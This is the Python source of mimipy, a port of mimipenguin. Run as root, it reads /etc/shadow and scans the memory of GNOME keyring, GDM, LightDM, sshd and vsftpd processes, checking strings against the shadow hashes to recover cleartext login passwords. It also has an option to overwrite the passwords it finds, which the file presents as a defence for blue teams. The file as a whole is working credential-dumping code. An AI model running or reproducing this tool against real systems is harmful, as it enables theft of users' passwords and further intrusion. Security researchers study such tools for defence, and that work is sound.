#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# mimipy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms


"""
    Author: Nicolas VERDIER (contact@n1nj4.eu)
    Original idea from @huntergregal (https://github.com/huntergregal/mimipenguin)
    This is a port in python of @huntergregal's bash script mimipenguin.sh with some improvments :
        - possibility to clean passwords found from memory
        - possibility to search for any trace of your password in all your processes
        - possibility to scan a process by pid
        - add some additional processes to scan like lightDM
    You can find the bleeding edge version of mimipy here : https://github.com/n1nj4sec/mimipy

"""
import sys, os
import urllib2
import crypt
import re
import argparse
import logging
import time
import random


try:
    from memorpy import *
except ImportError as e:
    logging.warning("%s\ninstall with: \"pip install https://github.com/n1nj4sec/memorpy/archive/master.zip\""%e)
    raise e

LOOK_AFTER_SIZE=1000*10**3
LOOK_BEFORE_SIZE=500*10**3

rules = [
    {
        "type" : "[SYSTEM - GNOME]",
        "process" : ["gnome-keyring-daemon", "gdm-password", "gdm-session-worker"],
        "near" : r"libgcrypt\.so\..+|libgck\-1\.so\.0|_pammodutil_getpwnam_|gkr_system_authtok",
    },
    {
        "type" : "[SYSTEM - LightDM]", # Ubuntu/xubuntu login screen :) https://doc.ubuntu-fr.org/lightdm
        "process" : ["lightdm"],
        "near" : r"_pammodutil_getpwnam_|gkr_system_authtok",
    },
    {
        "type" : "[SYSTEM - SSH]",
        "process" : ["sshd:"],
        "near" : r"sudo.+",
    },
    {
        "type" : "[SYSTEM - VSFTPD]",
        "process" : ["vsftpd"],
        "near" : r"^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$",
    },
]


def colorize(s, color="grey"):
    if s is None:
        return ""
    s=str(s)
    res=s
    COLOR_STOP="\033[0m"
    if color.lower()=="random":
        color=random.choice(["blue","red","green","yellow"])
    if color.lower()=="blue":
        res="\033[34m"+s+COLOR_STOP
    if color.lower()=="red":
        res="\033[31m"+s+COLOR_STOP
    if color.lower()=="green":
        res="\033[32m"+s+COLOR_STOP
    if color.lower()=="yellow":
        res="\033[33m"+s+COLOR_STOP
    if color.lower()=="grey":
        res="\033[37m"+s+COLOR_STOP
    if color.lower()=="darkgrey":
        res="\033[1;30m"+s+COLOR_STOP
    return res


def get_shadow_hashes():
    hashes=[]
    with open('/etc/shadow', 'rb') as f:
        for line in f:
            tab=line.split(":")
            if len(tab[1])>10:
                hashes.append((tab[0],tab[1]))
    return hashes


def memstrings(mw, start_offset=None, end_offset=None):
    for _,x in mw.mem_search(r"[\x1f-\x7e]{6,50}[\x00]", ftype='re', start_offset=start_offset, end_offset=end_offset):
        yield x



passwords_found=set()
def password_found(desc, user, process, password):
    global passwords_found
    if (process, user, password) not in passwords_found:
        passwords_found.add((process, user, password))
        print colorize("%s : "%desc, color="green")
        print colorize("\t- Process\t: %s"%process, color="grey")
        print colorize("\t- Username\t: %s"%user, color="grey")
        print colorize("\t- Password\t: %s"%password, color="grey")


REGEX_TYPE=type(re.compile("^plop$"))
def password_list_match(password_list, near):
    for passwd in password_list:
        if type(near) == REGEX_TYPE:
            if near.search(passwd):
                return True
        else:
            if re.search(near, passwd):
                return True
    return False

def get_strings_around(mw, addr, string_at_addr, max_strings=30):
    strings_list=[]
    for o in memstrings(mw, start_offset=int(addr-LOOK_BEFORE_SIZE), end_offset=int(addr+LOOK_AFTER_SIZE)):
        s=o.read(type='string', maxlen=51)
        strings_list.append(s)
        if len(strings_list)>=30 and string_at_addr in strings_list[max_strings/2]:
            break
        elif len(strings_list)>30:
            strings_list=strings_list[1:]
    return strings_list

def search_password():
    import getpass
    mypasswd=getpass.getpass("search your password: ")
    for procdic in Process.list():
        name=procdic["name"]
        pid=int(procdic["pid"])
        if pid==os.getpid():
            continue
        if "gnome-terminal-server" in name:
            continue #avoid false positives when password has been printed to screen by this script x)
        logging.info("Searching pass in %s (%s)"%(name, pid))
        try:
            mw=MemWorker(pid=pid)
            #for _,x in mw.mem_search(r"\$[0-9][a-z]?\$(?:[a-zA-Z0-9\./\-\+]{4,}\$)?[a-zA-Z0-9\./\-\+]{20,}", ftype='re'):
            #    h=x.read(type='string', maxlen=300)
            #    print "hash found in %s (%s) : %s"%(name, pid, h)
            #    strings_list=get_strings_around(mw, x, h)
            #    print "strings found around : %s"%strings_list
            #    if not strings_list:
            #        x.dump(before=200, size=400)
            for x in mw.mem_search(mypasswd):
                print colorize("[+] password found in process %s (%s) at offset %s !"%(name, pid, hex(x)), color="green")
                print "strings found around : "
                strings_list=get_strings_around(mw, x, mypasswd)
                print "strings found around : %s"%strings_list
                if not strings_list:
                    x.dump(before=200, size=400)
                #print "strings where the password's address is referenced :"
                #for _,o in mw.search_address(x):
                #    o.dump(before=200, size=400)
                #print "done"

        except Exception as e:
            logging.error("Error scanning process %s (%s): %s"%(name, pid, e))


def analyze_process(name, pid, rule, clean=False, cred_cb=None):
    logging.info("Analysing process %s (%s) ..."%(name, pid))
    password_tested=set() #to avoid hashing the same string multiple times
    mw=MemWorker(name=name, pid=pid)
    scanned_segments=[]
    for _,match_addr in mw.mem_search(rule["near"], ftype='re'):
        password_list=[]
        total=0
        start=int(match_addr-LOOK_AFTER_SIZE)
        end=int(match_addr+LOOK_AFTER_SIZE)
        logging.debug("looking between offsets %s-%s"%(hex(start),hex(end)))
        for s,e in scanned_segments:
            if end < s or start > e:
                continue #no collision
            elif start >=s and e >= start and end >= e:
                logging.debug("%s-%s reduced to %s-%s"%(hex(start), hex(end), hex(e), hex(end)))
                start=e-1000 #we only scan a smaller region because some of it has already been scanned
        scanned_segments.append((start, end))
        for x in memstrings(mw, start_offset=start, end_offset=end):
            passwd=x.read(type='string', maxlen=51)
            total+=1
            password_list.append(passwd)
            if len(password_list)>40:
                password_list=password_list[1:]
            if password_list_match(password_list, rule["near"]):
                for p in password_list:
                    if p not in password_tested:
                        password_tested.add(p)
                        for user, h in shadow_hashes:
                            if crypt.crypt(p, h) == h:
                                yield (rule["type"], user, p)
                                if clean:
                                    logging.info("cleaning password from memory in proc %s at offset: %s ..."%(name, hex(x)))
                                    x.write("x"*len(p))
shadow_hashes=[]
def mimipy_loot_passwords():
    global shadow_hashes
    shadow_hashes=get_shadow_hashes()
    for procdic in Process.list():
        name=procdic["name"]
        pid=int(procdic["pid"])
        for rule in rules:
            for rp in rule["process"]:
                if rp in name:
                    start_time=time.time()
                    try:
                        for t, u, p in analyze_process(name, pid, rule, clean=args.clean):
                            yield (t, name, u, p)
                    except Exception as e:
                        logging.warning("[-] %s"%e)
                    finally:
                        logging.info("Process %s analysed in %s seconds"%(name, int(time.time()-start_time)))


if __name__=="__main__":
    parser = argparse.ArgumentParser(description="""
    mimipy can loot passwords from memory or overwrite them to mitigate mimipenguin\'s dumps !

    Author: Nicolas VERDIER (contact@n1nj4.eu)
    orginal mimipenguin.sh script and idea from @huntergregal
    Bleeding Edge version: https://github.com/n1nj4sec/mimipy
    
    """, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('--clean', action='store_true', help='@blueteams protect yourself and clean found passwords from memory ! You might want to regularly run this on your workstation/servers')
    parser.add_argument('-v', '--verbose', action='store_true', help='be more verbose !')
    parser.add_argument('-p', '--pid', type=int, help='choose the process\'s pid to scan instead of automatic selection')
    parser.add_argument('--search-password', action='store_true', help='prompt for your password and search it in all your processes !.')
    args = parser.parse_args()

    #logging.basicConfig(filename='example.log', level=logging.DEBUG)
    if args.verbose:
        logging.basicConfig(stream=sys.stderr, level=logging.INFO)
    else:
        logging.basicConfig(stream=sys.stderr, level=logging.WARNING)

    total_time=time.time()

    if os.geteuid()!=0:
        logging.error("mimipy needs root ;)")
        exit(1)

    
    if args.search_password:
        search_password()
        exit(0)

    if args.pid:
        for procdic in Process.list():
            name=procdic["name"]
            pid=int(procdic["pid"])
            if pid==args.pid:
                try:
                    start_time=time.time()
                    for rule in rules:
                        analyze_process(name, pid, rule, clean=args.clean)
                except Exception as e:
                    logging.warning("[-] %s"%e)
                finally:
                    logging.info("Process %s analysed in %s seconds"%(name, int(time.time()-start_time)))
    else:
        for t, u, process, passwd in mimipy_loot_passwords():
            password_found(t, u, process, passwd)
    logging.info("Script executed in %s seconds"%int(time.time()-total_time))



